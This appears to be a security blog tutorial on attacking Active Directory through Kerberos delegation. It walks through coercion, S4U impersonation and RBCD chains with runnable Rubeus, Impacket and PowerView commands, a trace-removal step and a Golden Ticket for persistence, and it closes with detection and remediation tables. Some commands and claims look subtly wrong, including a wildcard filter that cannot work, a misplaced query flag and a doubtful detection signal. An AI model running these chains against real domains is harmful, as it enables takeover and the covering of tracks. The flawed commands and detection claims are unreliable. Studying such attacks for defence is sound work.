---
title: "Kerberos Delegation Attacks: Unconstrained, Constrained, RBCD"
description: "Understanding and exploiting all three Kerberos delegation types for lateral movement and privilege escalation in Active Directory - full coverage of the S4U2Self / S4U2Proxy protocol, coercion primitives, RBCD via GenericWrite, and the post-ms16-014 mitigation landscape."
date: 2026-02-25
difficulty: Hard
tags: [kerberos, delegation, rbcd, s4u, active-directory]
---

## Why Delegation Is the Most Productive AD Attack Class

Kerberos delegation was added to make legitimate multi-tier applications work - a user authenticates to a web server, the web server connects to a database on the user's behalf, and the database trusts the chain. The mechanism is sound when configured carefully and catastrophic when not. Three flavours exist (Unconstrained, Constrained, Resource-Based Constrained), and each has a distinct attack pattern. Understanding all three is required because the misconfiguration that hands you a domain in 30 minutes might be any one of them; almost no enterprise has zero delegation findings.

This post walks each delegation type, how to identify it, how to exploit it, and the protocol-level details that make the exploit work - followed by the mitigations that close each path.

## Quick Refresher - S4U2Self & S4U2Proxy

Two Kerberos extensions underlie all delegation attacks beyond Unconstrained:

- **S4U2Self** ("Service for User to Self"): A service can request a service ticket *to itself* on behalf of any user, **without** that user's password. The resulting ticket is suitable only for accessing the requesting service - it's primarily used to obtain the user's PAC (Privilege Attribute Certificate, containing groups and SIDs) for authorization decisions.
- **S4U2Proxy** ("Service for User to Proxy"): Given a service ticket *to itself* (from S4U2Self) and the appropriate delegation rights, a service can obtain a service ticket to *another* service, on behalf of the user named in the original ticket.

S4U2Self produces a **forwardable** ticket only if the requesting service has been granted delegation rights or if `TrustedToAuthForDelegation` is set. This subtlety underpins the difference between Unconstrained, Constrained, and RBCD.

## Unconstrained Delegation

Servers with unconstrained delegation store users' TGTs in memory when they connect. If you compromise such a server, you get every connecting user's TGT - including Domain Admins.

### How It Works

When a client authenticates to a service marked with `TRUSTED_FOR_DELEGATION` (`UAC_TRUSTED_FOR_DELEGATION`), Kerberos forwards the client's TGT alongside the service ticket. The service stores the forwarded TGT in its memory (LSASS), so it can use it later to authenticate to anything else on the user's behalf - anywhere in the domain, with no scope restriction.

Compromise such a server and you can extract every cached TGT from LSASS via Mimikatz, Rubeus, or the equivalent.

### Identifying Servers

```powershell
# PowerView
Get-DomainComputer -TrustedToAuth -Properties Name,UserAccountControl
Get-DomainComputer -Unconstrained -Properties Name | Where-Object { $_.Name -ne 'DC*' }

# ADModule / native PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -ne 516} -Properties Name

# BloodHound query
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

DCs are *always* `TrustedForDelegation` (it's how they function), so filter them out. Unconstrained delegation on any *non-DC* server is a red flag - print servers, file shares, web app servers historically had it set "because it just works".

### Exploitation

```powershell
# Monitor for incoming TGTs
Rubeus.exe monitor /interval:5

# Force DC authentication via PrinterBug/PetitPotam
SpoolSample.exe dc01.corp.local compromised-server.corp.local

# Captured DC01$ TGT → DCSync
```

Concrete chain:

1. Compromise an unconstrained-delegation server (`HOST-WEB1$`).
2. Run `Rubeus monitor` on it to dump newly received TGTs from LSASS continuously.
3. Coerce a privileged target (Domain Controller) to authenticate to your compromised host:
   - `SpoolSample` (MS-RPRN PrintNotify) - works if Print Spooler is running on the target, which it is by default on every Windows up to 2022.
   - `PetitPotam` (MS-EFSRPC) - works in unauthenticated mode in older builds; requires authenticated context on patched DCs.
   - `DFSCoerce` (MS-DFSNM) - works against DCs running the DFS-N service.
   - `PrivExchange` (push notifications) - Exchange-specific.
4. The DC connects to your unconstrained host using its machine account `DC01$`. Its TGT lands in LSASS.
5. Extract the DC's TGT, use it to DCSync (`DC01$` is implicitly a member of `Enterprise Domain Controllers` and has `Replicating Directory Changes` permission).
6. Dump `krbtgt`'s NT hash, mint a Golden Ticket, persist forever.

### Variants Worth Knowing

- **DA-coerced sessions**: instead of a DC, coerce a Domain Admin's workstation. When a DA logs into anything, their TGT lands in your unconstrained host's LSASS too.
- **WebDAV/HTTP coercion**: works against modern systems where SMB-based coercion is blocked.
- **Cross-forest variant**: TGT capture works across trust boundaries if the trust is configured for delegation.

## Constrained Delegation

Allows a server to impersonate users only to specific services listed in `msDS-AllowedToDelegateTo`. Exploitable via S4U2Self + S4U2Proxy.

### How It Works

Constrained delegation tries to plug Unconstrained's "delegate anywhere" hole by listing exactly which services a given account can delegate to. Two sub-flavours:

- **Use Kerberos only** - the protocol is Kerberos throughout; the user must authenticate with Kerberos to the front-end.
- **Use any authentication protocol** (`TrustedToAuthForDelegation`, also called "Protocol Transition") - the user can authenticate to the front-end with anything (NTLM, certificates), and the front-end then S4U2Self+S4U2Proxy to the back-end. **This flavour is the dangerous one.**

The reason Protocol Transition matters: with `TrustedToAuthForDelegation` set, a service can call S4U2Self for **any user** and get back a forwardable ticket - *even without that user actually authenticating*. The service then S4U2Proxy that into a ticket to any of the SPNs listed in `msDS-AllowedToDelegateTo`. If the SPN is `cifs/dc01.corp.local`, the service is now talking to the DC's CIFS share **as Administrator**.

### Identifying Targets

```powershell
# PowerView - find accounts with constrained delegation
Get-DomainUser -TrustedToAuth -Properties Name,msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth -Properties Name,msDS-AllowedToDelegateTo

# BloodHound
MATCH (c {trustedtoauth:true})-[:AllowedToDelegate]->(t) RETURN c.name, t.name
```

Look especially for accounts whose `msDS-AllowedToDelegateTo` contains a CIFS, HTTP, LDAP, or HOST SPN to a Domain Controller - those are direct paths to DC compromise.

### Exploitation

```powershell
# If you own a service with constrained delegation to cifs/dc01
Rubeus.exe s4u /user:svc_web$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/dc01 /ptt
```

Concrete chain:

1. Compromise the credentials (NT hash or AES key) of an account with constrained delegation + `TrustedToAuthForDelegation`. Common ways to get there: cracked Kerberoasting hash, dumped LSASS, weak password.
2. Run S4U2Self → S4U2Proxy as that account, impersonating Administrator (or any DA), targeting an SPN in the allowed list.
3. The TGS comes back; inject it (`/ptt`) and access the target as Administrator.

For DC SPNs, you can DCSync immediately. For CIFS/HOST you can copy `ntds.dit` or run remote commands.

### Service Class Smuggling

The TGS that S4U2Proxy returns has the SPN you specified - but Windows checks only the *target* portion of the SPN (the host), not the service class. So a TGS for `cifs/dc01` can also be used for `host/dc01`, `ldap/dc01`, `http/dc01`, etc. With one S4U2Proxy you've effectively got delegation rights to every service on `dc01`. Worth knowing because admins sometimes constrain only to `time/dc01` thinking it's harmless - it isn't.

## Resource-Based Constrained Delegation (RBCD)

The target service controls who can delegate to it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you can write to this attribute, you can delegate to yourself.

### Why RBCD Is the Easiest Modern Path

Constrained Delegation is configured on the *source* - only Domain Admins can set it (it requires `SeEnableDelegationPrivilege`). RBCD inverted the model: the *target* sets `msDS-AllowedToActOnBehalfOfOtherIdentity`, and the permission to write that attribute is just `GenericWrite` / `GenericAll` - a permission low-privilege users frequently inherit on computer objects (e.g., the user who joined a workstation to the domain has `GenericAll` on it implicitly via `MS-DS-CreatorSID`).

That dramatically lowers the bar. In real environments:

- A help-desk technician who can join machines to the domain owns `MS-DS-CreatorSID` on every machine they joined.
- Account Operators have `GenericWrite` on most user/computer objects.
- Custom delegation: `Workstation Admins` group with `GenericAll` on workstation OUs - extremely common.

### Exploitation

```powershell
# Create machine account
New-MachineAccount -MachineAccount FAKECOMP -Password "Pass123!"

# Set RBCD
Set-ADComputer dc01 -PrincipalsAllowedToDelegateToAccount FAKECOMP$

# S4U to impersonate DA
getST.py corp.local/FAKECOMP$:'Pass123!' -spn cifs/dc01 -impersonate administrator
```

Step by step:

1. **Create a fake computer account.** Every domain user can create up to `ms-DS-MachineAccountQuota` (default 10) computer accounts. The created account is automatically marked with the `SERVICE_PRINCIPAL_NAMES` and a known password we control.
   ```bash
   addcomputer.py -computer-name 'FAKECOMP$' -computer-pass 'Pass123!' \
       -dc-host dc01.corp.local corp.local/alice:'Pwd!'
   ```
2. **Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target** (DC01 in this example) with a security descriptor granting the fake computer account.
   ```bash
   rbcd.py -delegate-from 'FAKECOMP$' -delegate-to 'DC01$' -dc-ip 10.0.0.1 \
       -action 'write' corp.local/alice:'Pwd!'
   ```
3. **S4U2Self + S4U2Proxy as `FAKECOMP$`** to obtain a TGS for `cifs/dc01.corp.local` impersonating Administrator.
   ```bash
   getST.py -spn cifs/dc01.corp.local -impersonate administrator \
       -dc-ip 10.0.0.1 corp.local/'FAKECOMP$':'Pass123!'
   ```
4. **Use the ticket** - `secretsdump.py -k -no-pass dc01` gives you `krbtgt` and you're done.

### Removing the Trace

After exploitation, clean up `msDS-AllowedToActOnBehalfOfOtherIdentity`:

```bash
rbcd.py -delegate-from 'FAKECOMP$' -delegate-to 'DC01$' \
    -action 'flush' corp.local/alice:'Pwd!'
```

### When `MachineAccountQuota` Is Zero

Many hardened environments set MAQ to 0, blocking the "create a fake computer" trick. Workarounds:

- **Take over an existing computer account** - find a stale computer object you can compromise (LAPS-managed laptop, dormant server). With the machine account password, the same RBCD chain works.
- **ResetPassword on a computer object** where you have GenericAll - same outcome without creating a new account.
- **ServicePrincipalName-bearing user account** - if you can create or modify a user with an SPN, S4U2Proxy works the same way (the user effectively becomes a "service").

| Type | Who Controls | Requirement | Risk |
|------|-------------|-------------|------|
| Unconstrained | Source server | TrustedForDelegation | Critical |
| Constrained | Source server | AllowedToDelegateTo | High |
| RBCD | Target server | Write to target's RBCD attr | High |

## Detection

| Signal | Where |
|---|---|
| TGT forwarded to non-DC server | DC Event 4769 with `Ticket Encryption Type 0x12` and `OptionsHexValue 0x40810010` (forwardable bit) |
| S4U2Self/S4U2Proxy frequency anomaly | DC Event 4769 - abnormally many tickets requested by one service principal |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` modification | DC Directory Service log, Event 5136 with attribute name = `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| Computer account creation by non-admin | DC Event 4741 |
| Coercion attempts (PetitPotam/PrintNighmare/DFSCoerce) | Network detection or RPC audit logs |
| TGT requested for newly-created machine account | DC Event 4768 immediately after a 4741 |

## Remediation Catalogue

| Type | Mitigations |
|---|---|
| Unconstrained | Remove `TrustedForDelegation` from any non-DC; mark privileged accounts as `Sensitive and cannot be delegated` (UAC bit `NOT_DELEGATED`); add to `Protected Users` group; deny coercion at network layer (block SMB/RPC inbound to non-DC servers); patch coercion CVEs (PrintNightmare, PetitPotam) |
| Constrained | Audit `msDS-AllowedToDelegateTo` for SPNs targeting DCs / sensitive systems; remove Protocol Transition unless justified; rotate keys of any account with constrained delegation regularly |
| RBCD | Set `MachineAccountQuota` to 0 (`Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"=0}`); audit `GenericWrite`/`GenericAll` on computer objects; mark privileged accounts as `Sensitive and cannot be delegated`; add Tier-0 accounts to `Protected Users`; alert on `msDS-AllowedToActOnBehalfOfOtherIdentity` modifications |

The single most impactful control is `Protected Users` group + `Sensitive and cannot be delegated` UAC bit on every Tier-0 / privileged account. With that set, no S4U-based attack against those accounts succeeds - the KDC refuses to issue forwardable tickets for them.

> RBCD is the most commonly exploited delegation type in modern red team engagements because the barrier is just GenericWrite on any computer object - and that permission is handed out far more liberally than people realise. Audit your computer object DACLs; the findings are usually surprising.
